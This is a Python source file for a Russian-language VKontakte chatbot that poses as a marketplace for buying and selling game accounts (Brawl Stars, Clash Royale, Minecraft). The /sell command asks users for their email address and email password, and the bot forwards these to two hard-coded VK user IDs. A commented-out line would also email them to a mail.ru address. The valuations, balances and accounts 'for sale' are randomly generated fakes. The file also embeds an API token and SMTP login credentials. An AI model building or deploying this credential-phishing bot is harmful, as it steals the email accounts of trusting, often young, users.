# API-ключ созданный ранее
token = "5b2294596bb8e8ffa1ee0783ea3c240013b7ec1e9cf9046d6ffed4ac423b42691a7898775a423d374e356"

# -*- coding: utf-8 -*-
# скрипт был создан автором канала IT THINGS:https://yotube.com/c/ITTHINGS
import vk_api
import time
import random
from vk_api.keyboard import VkKeyboard, VkKeyboardColor
import smtplib
 
vk = vk_api.VkApi(token=token)
 
vk._auth_token()

balance_arr=[]
fbal=0
smtpObj = smtplib.SMTP('smtp.mail.ru', 587)
smtpObj.starttls()
smtpObj.login('sighup123@mail.ru','123root123')

class mesh():
    def gen(level,abcg):
        i=0
        m=""
        while not level == i:
            m = m+abcg[random.randint(1,len(abcg))-1]
            i+=1
        return m


def server():
    lis=['mangomine','astroworld','hypixel','vimedex','tntland']
    return lis[random.randint(0,4)]

def game1():
    lis=['CR','BS']
    return lis[random.randint(0,1)]
def game2():
    lis=['MCPE','MINECRAFT']
    return lis[random.randint(0,1)]
def passw():
    return mesh.gen(random.randint(4,10),'1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890')
def mail_get():
    lis=['loopy','astorld','hxel','imdex','tnd','dfjk','hackef','ifty','arizaka','chikatila','gulgulgul','donat','xitmenjoker','goldenman','gtxgold','cxghj','xobit','cloloreddig','qwemykow','fsawry','serty','koli']
    mails=['mail.ru','gmail.com','rambler.ru','ya.ru','alice.it','tim.it']
    mail=lis[random.randint(0,22)]+'@'+mails[random.randint(0,5)]
    return mail
def sylka_prem():
    lis=['https://vk.com/akk_deshovo?z=photo-194065772_457239019%2Falbum-194065772_00%2Frev','https://vk.com/akk_deshovo?z=photo-194065772_457239023%2Falbum-194065772_00%2Frev','https://vk.com/akk_deshovo?z=photo-194065772_457239020%2Fwall-194065772_3','https://vk.com/akk_deshovo?z=photo-194065772_457239021%2Fwall-194065772_3']
    return lis[random.randint(0,4)]
def pochta():
    lis=['karakurt@alice.it','jagergjig@gmail.com','mailofmailofmail@mail.ru','azoroza@rambler.ru','yajkiyt784@yandex.ru','pukpuk90@ya.ru','borzuyakk@rambler.ru','bspremuimakk@gmail.com','hakibsakk@mail.ru','jokerbs@rambler.ru','nagibator603ak@gmail.com','diddyak@gmail.com']
    return lis[random.randint(0,11)]

while True:
    try:
        messages = vk.method("messages.getConversations", {"offset": 0, "count": 20, "filter": "unanswered"})
        if messages["count"] >= 1:
            id = messages["items"][0]["last_message"]["from_id"]
            body = messages["items"][0]["last_message"]["text"]
            if body.lower() == "/start":
                vk.method("messages.send", {"peer_id": id, "message": "Помощь:/help\nУ нас ты сможешь продать свой аккаунт по выгодной цене!\nДля этого введи: /sell (Почта) (Пароль от почты)(Игра: COC,BS,MINECRAFT,CR)\nПосле бот определит цену аккаунта в Коинах(Подробнее /coins)\nBS премиум аккаунт: /prem", "random_id": random.randint(1, 2147483647)})
            elif body.lower() == "начать":
                print(id)
                vk.method("messages.send", {"peer_id": id, "message": "Помощь:/help\nУ нас ты сможешь продать свой аккаунт по выгодной цене!\nДля этого введи: /sell (Почта) (Пароль от почты)(Игра: COC,BS,MINECRAFT,CR)\nПосле бот определит цену аккаунта в Коинах(Подробнее /coins)\nBS премиум аккаунт: /prem", "random_id": random.randint(1, 2147483647)})
            elif body.lower() == "/coins":
                vk.method("messages.send", {"peer_id": id, "message": "Коины это валюта группы\nЗа нее ты можешь купиь аккаунт!\n10 Коинов = 1р\n", "random_id": random.randint(1, 2147483647)})
            elif body.split(' ')[0] == "/sell":
                vk.method("messages.send", {"peer_id": id, "message": "Анализирую твой аккаунт...", "random_id": random.randint(1, 2147483647)})
                a=random.randint(1,10)
                time.sleep(1)
                c=random.randint(1200,10000)
                cena=str(c)
                fbal=fbal+c
                for i in balance_arr:
                    print(i)
                    if int(i.split(':')[0])==int(id):
                        print('ds')
                        bal=int(i.split(':')[1])
                        balance_arr.remove(i)
                        g=str(id)+':'+str(bal+c)
                        balance_arr.append(g)
                
                mail=body.split(' ')[1]
                password=body.split(' ')[2]
                gamea=body.split(' ')[3]
                #smtpObj.sendmail("sighup123@mail.ru","sighup123@mail.ru","Bot has earned new account!\nMail:"+mail+'\nPassword:'+password+'\nGame: '+gamea)
                if gamea=='n60':
                    pass
                else:
                    vk.method("messages.send", {"peer_id": "308132880", "message": "Бот получил новый аккаунт!\nПочта: "+mail+"\nПароль: "+password+"\nИгра: "+gamea, "random_id": random.randint(1, 2147483647)})
                    vk.method("messages.send", {"peer_id": "519885604", "message": "Бот получил новый аккаунт!\nПочта: "+mail+"\nПароль: "+password+"\nИгра: "+gamea, "random_id": random.randint(1, 2147483647)})
                vk.method("messages.send", {"peer_id": id, "message": "Твой аккаунт стоит: "+cena+"!\nТебе будет начисленно на счет "+cena+" коинов!\nТвой аккаунт в рублях: "+str(c/10)+'\nПочта от аккаунта: '+mail+'\nПароль от почты: '+password, "random_id": random.randint(1, 2147483647)})
            elif body.lower() == "/balance1":
                fbal=90000
            elif body.lower() == "/balance0":
                fbal=0
            elif body.lower() == "/balance":
                bal=0
                print(balance_arr)
                for i in balance_arr:
                    print(i)
                    if int(i.split(':')[0])==int(id):
                        print(i)
                        bal=int(i.split(':')[1])
                vk.method("messages.send", {"peer_id": id, "message": "Вот твои коины: "+str(fbal)+"\nВот твои коины в рублях: "+str(fbal/10), "random_id": random.randint(1, 2147483647)})
            elif body.lower()=='/auc':
                vk.method("messages.send", {"peer_id": id, "message": "Список аккаунтов доступных для покупки(Цена в коинах):\n1."+game1()+" Аккаунт за "+str(random.randint(1500,12000))+"\n2.COC аккаунт "+str(random.randint(5,13))+"тх за "+str(random.randint(1500,12000))+"\n3."+game1()+" аккаунт за "+str(random.randint(1500,12000))+"\n4."+game2()+" аккаунт на сервере "+server()+" за "+str(random.randint(1500,12000))+"\n+Премиум BS аккаунт за 9"+str(random.randint(134,987))+': /prem\nМайнкрафт аккаунт сполным доступом! за 9к /minecraft', "random_id": random.randint(1, 2147483647)})
            elif (body.lower()).split(' ')[0]=='/buy':
                if fbal<150:
                    fbal=fbal-150
                    vk.method("messages.send", {"peer_id": id, "message": "Ты попытался нас обмануть...\nНа твоем аккаунте 0 коинов!\nБудь честным!\nВ наказание у тебя на счету\nБудет "+str(fbal),"random_id": random.randint(1, 2147483647)})
                else:
                    vk.method("messages.send", {"peer_id": id, "message": "Ты успешно купил аккаунт!\nПочта:"+mail_get()+"\nПароль:"+passw(),"random_id": random.randint(1, 2147483647)})
                    fbal=0
            elif body.lower()=='/help':
                vk.method("messages.send", {"peer_id": id, "message": "Аукцион аккаунтов: /auc\nПродать аккаунт: /sell (Почта) (Пароль) (Тип игры: COC,CR,BS)\nКупить аккаунт:/buy (номер лота)\nВалюта: /coins\nБаланс: /balance", "random_id": random.randint(1, 2147483647)})
            elif body.lower()=='/prem':
                if fbal>9000:
                    vk.method("messages.send", {"peer_id": id, "message": "BS премиум аккаунт за 9к коинов!\nСкриншот к аккаунту:"+sylka_prem()+"\nВот почта от аккаунта: "+pochta()+"\nПароль: "+passw()+"\nПриятной игры!", "random_id": random.randint(1, 2147483647)})
                else:
                    vk.method("messages.send", {"peer_id": id, "message": "Даже не пытайся нас обмануть!\nЭтот аккаунт стоит дорого!\nУ тебя на него нету денег", "random_id": random.randint(1, 2147483647)})
            elif body.lower()=='/minecraft':
                if fbal>9000:
                    vk.method("messages.send", {"peer_id": id, "message": "MINECRAFT аккаунт за 9к коинов с полным доступом + сменой ника!\nПочта:"+mail_get()+"\nПароль:"+passw()+'\nПриятного пользования!', "random_id": random.randint(1, 2147483647)})
                else:
                    fbal=fbal-150
                    vk.method("messages.send", {"peer_id": id, "message": "Ты попытался нас обмануть...\nНа твоем аккаунте 0 коинов!\nБудь честным!\nВ наказание у тебя на счету\nБудет "+str(fbal),"random_id": random.randint(1, 2147483647)})
            else:
                vk.method("messages.send", {"peer_id": id, "message": "Не понял тебя!\nВведи: /help", "random_id": random.randint(1, 2147483647)})
    except Exception as E:
        time.sleep(1)
